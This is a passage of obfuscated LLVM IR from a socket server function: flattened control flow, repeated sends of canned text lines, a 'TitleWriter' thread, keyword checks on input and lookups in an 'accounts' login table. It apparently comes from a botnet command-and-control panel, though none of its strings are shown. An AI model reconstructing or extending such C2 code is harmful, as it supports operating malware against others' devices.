  %529 = call i32 (i8*, i8*, ...) @sprintf(i8* %528, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.87, i32 0, i32 0)) #7
  %530 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %531 = call i32 (i8*, i8*, ...) @sprintf(i8* %530, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.88, i32 0, i32 0)) #7
  %532 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %533 = call i32 (i8*, i8*, ...) @sprintf(i8* %532, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.89, i32 0, i32 0)) #7
  %534 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %535 = call i32 (i8*, i8*, ...) @sprintf(i8* %534, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.90, i32 0, i32 0)) #7
  %536 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %537 = call i32 (i8*, i8*, ...) @sprintf(i8* %536, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.91, i32 0, i32 0)) #7
  %538 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %539 = call i32 (i8*, i8*, ...) @sprintf(i8* %538, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.92, i32 0, i32 0)) #7
  %540 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %541 = call i32 (i8*, i8*, ...) @sprintf(i8* %540, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.93, i32 0, i32 0)) #7
  %542 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %543 = call i32 (i8*, i8*, ...) @sprintf(i8* %542, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.94, i32 0, i32 0)) #7
  %544 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %545 = call i32 (i8*, i8*, ...) @sprintf(i8* %544, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.95, i32 0, i32 0)) #7
  %546 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i32 0, i32 0
  %547 = call i32 (i8*, i8*, ...) @sprintf(i8* %546, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.96, i32 0, i32 0)) #7
  %548 = load i32, i32* %4, align 4
  %549 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i32 0, i32 0
  %550 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i32 0, i32 0
  %551 = call i64 @strlen(i8* %550) #8
  %552 = call i64 @send(i32 %548, i8* %549, i64 %551, i32 16384)
  %553 = icmp eq i64 %552, -1
  %554 = select i1 %553, i32 59814654, i32 -222310070
  store i32 %554, i32* %switchVar
  br label %loopEnd

; <label>:555:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:556:                                    ; preds = %loopEntry
  %557 = load i32, i32* %4, align 4
  %558 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i32 0, i32 0
  %559 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i32 0, i32 0
  %560 = call i64 @strlen(i8* %559) #8
  %561 = call i64 @send(i32 %557, i8* %558, i64 %560, i32 16384)
  %562 = icmp eq i64 %561, -1
  %563 = select i1 %562, i32 -1135386714, i32 1589060296
  store i32 %563, i32* %switchVar
  br label %loopEnd

; <label>:564:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:565:                                    ; preds = %loopEntry
  %566 = load i32, i32* %4, align 4
  %567 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i32 0, i32 0
  %568 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i32 0, i32 0
  %569 = call i64 @strlen(i8* %568) #8
  %570 = call i64 @send(i32 %566, i8* %567, i64 %569, i32 16384)
  %571 = icmp eq i64 %570, -1
  %572 = select i1 %571, i32 -1057554719, i32 -683379368
  store i32 %572, i32* %switchVar
  br label %loopEnd

; <label>:573:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:574:                                    ; preds = %loopEntry
  %575 = load i32, i32* %4, align 4
  %576 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %577 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %578 = call i64 @strlen(i8* %577) #8
  %579 = call i64 @send(i32 %575, i8* %576, i64 %578, i32 16384)
  %580 = icmp eq i64 %579, -1
  %581 = select i1 %580, i32 877812380, i32 1264405835
  store i32 %581, i32* %switchVar
  br label %loopEnd

; <label>:582:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:583:                                    ; preds = %loopEntry
  %584 = load i32, i32* %4, align 4
  %585 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %586 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %587 = call i64 @strlen(i8* %586) #8
  %588 = call i64 @send(i32 %584, i8* %585, i64 %587, i32 16384)
  %589 = icmp eq i64 %588, -1
  %590 = select i1 %589, i32 -1262629810, i32 -1478182128
  store i32 %590, i32* %switchVar
  br label %loopEnd

; <label>:591:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:592:                                    ; preds = %loopEntry
  %593 = load i32, i32* %4, align 4
  %594 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i32 0, i32 0
  %595 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i32 0, i32 0
  %596 = call i64 @strlen(i8* %595) #8
  %597 = call i64 @send(i32 %593, i8* %594, i64 %596, i32 16384)
  %598 = icmp eq i64 %597, -1
  %599 = select i1 %598, i32 1511155800, i32 1384588159
  store i32 %599, i32* %switchVar
  br label %loopEnd

; <label>:600:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:601:                                    ; preds = %loopEntry
  %602 = load i32, i32* %4, align 4
  %603 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %604 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %605 = call i64 @strlen(i8* %604) #8
  %606 = call i64 @send(i32 %602, i8* %603, i64 %605, i32 16384)
  %607 = icmp eq i64 %606, -1
  %608 = select i1 %607, i32 -331194466, i32 -826363171
  store i32 %608, i32* %switchVar
  br label %loopEnd

; <label>:609:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:610:                                    ; preds = %loopEntry
  %611 = load i32, i32* %4, align 4
  %612 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i32 0, i32 0
  %613 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i32 0, i32 0
  %614 = call i64 @strlen(i8* %613) #8
  %615 = call i64 @send(i32 %611, i8* %612, i64 %614, i32 16384)
  %616 = icmp eq i64 %615, -1
  %617 = select i1 %616, i32 688351338, i32 1256701672
  store i32 %617, i32* %switchVar
  br label %loopEnd

; <label>:618:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:619:                                    ; preds = %loopEntry
  %620 = load i32, i32* %4, align 4
  %621 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %622 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %623 = call i64 @strlen(i8* %622) #8
  %624 = call i64 @send(i32 %620, i8* %621, i64 %623, i32 16384)
  %625 = icmp eq i64 %624, -1
  %626 = select i1 %625, i32 -538891298, i32 1194696687
  store i32 %626, i32* %switchVar
  br label %loopEnd

; <label>:627:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:628:                                    ; preds = %loopEntry
  %629 = load i32, i32* %4, align 4
  %630 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i32 0, i32 0
  %631 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i32 0, i32 0
  %632 = call i64 @strlen(i8* %631) #8
  %633 = call i64 @send(i32 %629, i8* %630, i64 %632, i32 16384)
  %634 = icmp eq i64 %633, -1
  %635 = select i1 %634, i32 -1434754870, i32 1828376701
  store i32 %635, i32* %switchVar
  br label %loopEnd

; <label>:636:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:637:                                    ; preds = %loopEntry
  %638 = load i32, i32* %4, align 4
  %639 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %640 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %641 = call i64 @strlen(i8* %640) #8
  %642 = call i64 @send(i32 %638, i8* %639, i64 %641, i32 16384)
  %643 = icmp eq i64 %642, -1
  %644 = select i1 %643, i32 -1464970187, i32 514876695
  store i32 %644, i32* %switchVar
  br label %loopEnd

; <label>:645:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:646:                                    ; preds = %loopEntry
  %647 = load i32, i32* %4, align 4
  %648 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %649 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %650 = call i64 @strlen(i8* %649) #8
  %651 = call i64 @send(i32 %647, i8* %648, i64 %650, i32 16384)
  %652 = icmp eq i64 %651, -1
  %653 = select i1 %652, i32 -1007010537, i32 -520190682
  store i32 %653, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:655:                                    ; preds = %loopEntry
  %656 = load i32, i32* %4, align 4
  %657 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %658 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %659 = call i64 @strlen(i8* %658) #8
  %660 = call i64 @send(i32 %656, i8* %657, i64 %659, i32 16384)
  %661 = icmp eq i64 %660, -1
  %662 = select i1 %661, i32 1322167323, i32 -517692663
  store i32 %662, i32* %switchVar
  br label %loopEnd

; <label>:663:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:664:                                    ; preds = %loopEntry
  %665 = load i32, i32* %4, align 4
  %666 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %667 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %668 = call i64 @strlen(i8* %667) #8
  %669 = call i64 @send(i32 %665, i8* %666, i64 %668, i32 16384)
  %670 = icmp eq i64 %669, -1
  %671 = select i1 %670, i32 -1367756754, i32 -1313976157
  store i32 %671, i32* %switchVar
  br label %loopEnd

; <label>:672:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:673:                                    ; preds = %loopEntry
  %674 = load i32, i32* %4, align 4
  %675 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %676 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %677 = call i64 @strlen(i8* %676) #8
  %678 = call i64 @send(i32 %674, i8* %675, i64 %677, i32 16384)
  %679 = icmp eq i64 %678, -1
  %680 = select i1 %679, i32 -590703365, i32 398088364
  store i32 %680, i32* %switchVar
  br label %loopEnd

; <label>:681:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:682:                                    ; preds = %loopEntry
  %683 = load i32, i32* %4, align 4
  %684 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %685 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %686 = call i64 @strlen(i8* %685) #8
  %687 = call i64 @send(i32 %683, i8* %684, i64 %686, i32 16384)
  %688 = icmp eq i64 %687, -1
  %689 = select i1 %688, i32 -1632487816, i32 1308647794
  store i32 %689, i32* %switchVar
  br label %loopEnd

; <label>:690:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:691:                                    ; preds = %loopEntry
  %692 = load i32, i32* %4, align 4
  %693 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %694 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %695 = call i64 @strlen(i8* %694) #8
  %696 = call i64 @send(i32 %692, i8* %693, i64 %695, i32 16384)
  %697 = icmp eq i64 %696, -1
  %698 = select i1 %697, i32 58091983, i32 317437
  store i32 %698, i32* %switchVar
  br label %loopEnd

; <label>:699:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:700:                                    ; preds = %loopEntry
  %701 = load i32, i32* %4, align 4
  %702 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %703 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %704 = call i64 @strlen(i8* %703) #8
  %705 = call i64 @send(i32 %701, i8* %702, i64 %704, i32 16384)
  %706 = icmp eq i64 %705, -1
  %707 = select i1 %706, i32 227316095, i32 1184665850
  store i32 %707, i32* %switchVar
  br label %loopEnd

; <label>:708:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:709:                                    ; preds = %loopEntry
  %710 = load i32, i32* %4, align 4
  %711 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %712 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %713 = call i64 @strlen(i8* %712) #8
  %714 = call i64 @send(i32 %710, i8* %711, i64 %713, i32 16384)
  %715 = icmp eq i64 %714, -1
  %716 = select i1 %715, i32 -1480355624, i32 -496727325
  store i32 %716, i32* %switchVar
  br label %loopEnd

; <label>:717:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:718:                                    ; preds = %loopEntry
  %719 = load i32, i32* %4, align 4
  %720 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %721 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %722 = call i64 @strlen(i8* %721) #8
  %723 = call i64 @send(i32 %719, i8* %720, i64 %722, i32 16384)
  %724 = icmp eq i64 %723, -1
  %725 = select i1 %724, i32 1154941085, i32 463250050
  store i32 %725, i32* %switchVar
  br label %loopEnd

; <label>:726:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:727:                                    ; preds = %loopEntry
  %728 = load i32, i32* %4, align 4
  %729 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %730 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %731 = call i64 @strlen(i8* %730) #8
  %732 = call i64 @send(i32 %728, i8* %729, i64 %731, i32 16384)
  %733 = icmp eq i64 %732, -1
  %734 = select i1 %733, i32 -1074347066, i32 250313327
  store i32 %734, i32* %switchVar
  br label %loopEnd

; <label>:735:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:736:                                    ; preds = %loopEntry
  %737 = load i32, i32* %4, align 4
  %738 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %739 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %740 = call i64 @strlen(i8* %739) #8
  %741 = call i64 @send(i32 %737, i8* %738, i64 %740, i32 16384)
  %742 = icmp eq i64 %741, -1
  %743 = select i1 %742, i32 2027778628, i32 1363475107
  store i32 %743, i32* %switchVar
  br label %loopEnd

; <label>:744:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:745:                                    ; preds = %loopEntry
  %746 = load i32, i32* %4, align 4
  %747 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %748 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %749 = call i64 @strlen(i8* %748) #8
  %750 = call i64 @send(i32 %746, i8* %747, i64 %749, i32 16384)
  %751 = icmp eq i64 %750, -1
  %752 = select i1 %751, i32 -1579496471, i32 1019820144
  store i32 %752, i32* %switchVar
  br label %loopEnd

; <label>:753:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:754:                                    ; preds = %loopEntry
  %755 = load i32, i32* %4, align 4
  %756 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %757 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %758 = call i64 @strlen(i8* %757) #8
  %759 = call i64 @send(i32 %755, i8* %756, i64 %758, i32 16384)
  %760 = icmp eq i64 %759, -1
  %761 = select i1 %760, i32 -1661345552, i32 -1511313758
  store i32 %761, i32* %switchVar
  br label %loopEnd

; <label>:762:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:763:                                    ; preds = %loopEntry
  %764 = load i32, i32* %4, align 4
  %765 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i32 0, i32 0
  %766 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i32 0, i32 0
  %767 = call i64 @strlen(i8* %766) #8
  %768 = call i64 @send(i32 %764, i8* %765, i64 %767, i32 16384)
  %769 = icmp eq i64 %768, -1
  %770 = select i1 %769, i32 1070029390, i32 -934285809
  store i32 %770, i32* %switchVar
  br label %loopEnd

; <label>:771:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:772:                                    ; preds = %loopEntry
  %773 = load i8*, i8** %3, align 8
  %774 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %773) #7
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:775:                                    ; preds = %loopEntry
  %776 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %777 = call i8* @strstr(i8* %776, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.97, i32 0, i32 0)) #8
  %778 = icmp ne i8* %777, null
  %779 = select i1 %778, i32 1519248665, i32 -1607809843
  store i32 %779, i32* %switchVar
  br label %loopEnd

; <label>:780:                                    ; preds = %loopEntry
  %781 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %781, i8 0, i64 2048, i32 16, i1 false)
  %782 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  %783 = call i32 (i8*, i8*, ...) @sprintf(i8* %782, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.98, i32 0, i32 0)) #7
  %784 = load i32, i32* %4, align 4
  %785 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  %786 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  %787 = call i64 @strlen(i8* %786) #8
  %788 = call i64 @send(i32 %784, i8* %785, i64 %787, i32 16384)
  %789 = icmp eq i64 %788, -1
  %790 = select i1 %789, i32 -477185471, i32 2087254758
  store i32 %790, i32* %switchVar
  br label %loopEnd

; <label>:791:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:792:                                    ; preds = %loopEntry
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:793:                                    ; preds = %loopEntry
  %794 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %795 = call i8* @strstr(i8* %794, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.99, i32 0, i32 0)) #8
  %796 = icmp ne i8* %795, null
  %797 = select i1 %796, i32 -1107034613, i32 -1352405219
  store i32 %797, i32* %switchVar
  br label %loopEnd

; <label>:798:                                    ; preds = %loopEntry
  %799 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %799, i8 0, i64 2048, i32 16, i1 false)
  %800 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i32 0, i32 0
  %801 = call i32 (i8*, i8*, ...) @sprintf(i8* %800, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.100, i32 0, i32 0)) #7
  %802 = load i32, i32* %4, align 4
  %803 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i32 0, i32 0
  %804 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i32 0, i32 0
  %805 = call i64 @strlen(i8* %804) #8
  %806 = call i64 @send(i32 %802, i8* %803, i64 %805, i32 16384)
  %807 = icmp eq i64 %806, -1
  %808 = select i1 %807, i32 332770803, i32 -2109711874
  store i32 %808, i32* %switchVar
  br label %loopEnd

; <label>:809:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:810:                                    ; preds = %loopEntry
  %811 = load i32, i32* %4, align 4
  %812 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %813 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %814 = call i64 @strlen(i8* %813) #8
  %815 = call i64 @send(i32 %811, i8* %812, i64 %814, i32 16384)
  %816 = icmp eq i64 %815, -1
  %817 = select i1 %816, i32 -973207482, i32 841462765
  store i32 %817, i32* %switchVar
  br label %loopEnd

; <label>:818:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:819:                                    ; preds = %loopEntry
  %820 = load i32, i32* %4, align 4
  %821 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %822 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %823 = call i64 @strlen(i8* %822) #8
  %824 = call i64 @send(i32 %820, i8* %821, i64 %823, i32 16384)
  %825 = icmp eq i64 %824, -1
  %826 = select i1 %825, i32 -2030765725, i32 1341857148
  store i32 %826, i32* %switchVar
  br label %loopEnd

; <label>:827:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:828:                                    ; preds = %loopEntry
  %829 = load i32, i32* %4, align 4
  %830 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %831 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %832 = call i64 @strlen(i8* %831) #8
  %833 = call i64 @send(i32 %829, i8* %830, i64 %832, i32 16384)
  %834 = icmp eq i64 %833, -1
  %835 = select i1 %834, i32 1803301887, i32 -1505442743
  store i32 %835, i32* %switchVar
  br label %loopEnd

; <label>:836:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:837:                                    ; preds = %loopEntry
  %838 = load i32, i32* %4, align 4
  %839 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %840 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %841 = call i64 @strlen(i8* %840) #8
  %842 = call i64 @send(i32 %838, i8* %839, i64 %841, i32 16384)
  %843 = icmp eq i64 %842, -1
  %844 = select i1 %843, i32 215704077, i32 -777581555
  store i32 %844, i32* %switchVar
  br label %loopEnd

; <label>:845:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:846:                                    ; preds = %loopEntry
  %847 = load i32, i32* %4, align 4
  %848 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %849 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %850 = call i64 @strlen(i8* %849) #8
  %851 = call i64 @send(i32 %847, i8* %848, i64 %850, i32 16384)
  %852 = icmp eq i64 %851, -1
  %853 = select i1 %852, i32 -971756845, i32 1666389819
  store i32 %853, i32* %switchVar
  br label %loopEnd

; <label>:854:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:855:                                    ; preds = %loopEntry
  %856 = load i32, i32* %4, align 4
  %857 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %858 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %859 = call i64 @strlen(i8* %858) #8
  %860 = call i64 @send(i32 %856, i8* %857, i64 %859, i32 16384)
  %861 = icmp eq i64 %860, -1
  %862 = select i1 %861, i32 1039129946, i32 1159070925
  store i32 %862, i32* %switchVar
  br label %loopEnd

; <label>:863:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:864:                                    ; preds = %loopEntry
  %865 = load i32, i32* %4, align 4
  %866 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %867 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %868 = call i64 @strlen(i8* %867) #8
  %869 = call i64 @send(i32 %865, i8* %866, i64 %868, i32 16384)
  %870 = icmp eq i64 %869, -1
  %871 = select i1 %870, i32 -1300793966, i32 820821060
  store i32 %871, i32* %switchVar
  br label %loopEnd

; <label>:872:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:873:                                    ; preds = %loopEntry
  %874 = load i32, i32* %4, align 4
  %875 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %876 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %877 = call i64 @strlen(i8* %876) #8
  %878 = call i64 @send(i32 %874, i8* %875, i64 %877, i32 16384)
  %879 = icmp eq i64 %878, -1
  %880 = select i1 %879, i32 1471440996, i32 -498526951
  store i32 %880, i32* %switchVar
  br label %loopEnd

; <label>:881:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:882:                                    ; preds = %loopEntry
  store i32 -821741606, i32* %switchVar
  br label %loopEnd

; <label>:883:                                    ; preds = %loopEntry
  %884 = load i32, i32* %4, align 4
  %885 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %886 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %887 = call i64 @strlen(i8* %886) #8
  %888 = call i64 @send(i32 %884, i8* %885, i64 %887, i32 16384)
  %889 = icmp eq i64 %888, -1
  %890 = select i1 %889, i32 1577261804, i32 -1601231392
  store i32 %890, i32* %switchVar
  br label %loopEnd

; <label>:891:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:892:                                    ; preds = %loopEntry
  %893 = load i32, i32* %4, align 4
  %894 = call i64 @send(i32 %893, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.35, i32 0, i32 0), i64 12, i32 16384)
  %895 = icmp eq i64 %894, -1
  %896 = select i1 %895, i32 1613265145, i32 -1871422235
  store i32 %896, i32* %switchVar
  br label %loopEnd

; <label>:897:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:898:                                    ; preds = %loopEntry
  store i32 -1954477189, i32* %switchVar
  br label %loopEnd

; <label>:899:                                    ; preds = %loopEntry
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:900:                                    ; preds = %loopEntry
  %901 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %902 = call i8* @strstr(i8* %901, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0)) #8
  %903 = icmp ne i8* %902, null
  %904 = select i1 %903, i32 198846320, i32 2053141843
  store i32 %904, i32* %switchVar
  br label %loopEnd

; <label>:905:                                    ; preds = %loopEntry
  %906 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %906, i8 0, i64 2048, i32 16, i1 false)
  %907 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i32 0, i32 0
  %908 = load i32, i32* %5, align 4
  %909 = sext i32 %908 to i64
  %910 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %909
  %911 = getelementptr inbounds %struct.login_info, %struct.login_info* %910, i32 0, i32 0
  %912 = getelementptr inbounds [20 x i8], [20 x i8]* %911, i32 0, i32 0
  %913 = call i32 (i8*, i8*, ...) @sprintf(i8* %907, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* %912) #7
  %914 = load i32, i32* %4, align 4
  %915 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i32 0, i32 0
  %916 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i32 0, i32 0
  %917 = call i64 @strlen(i8* %916) #8
  %918 = call i64 @send(i32 %914, i8* %915, i64 %917, i32 16384)
  %919 = icmp eq i64 %918, -1
  %920 = select i1 %919, i32 -1369699226, i32 459374223
  store i32 %920, i32* %switchVar
  br label %loopEnd

; <label>:921:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:922:                                    ; preds = %loopEntry
  %923 = call i32 @sleep(i32 5)
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:924:                                    ; preds = %loopEntry
  %925 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %925)
  %926 = load i32, i32* %4, align 4
  %927 = call i64 @send(i32 %926, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.103, i32 0, i32 0), i64 11, i32 16384)
  %928 = icmp eq i64 %927, -1
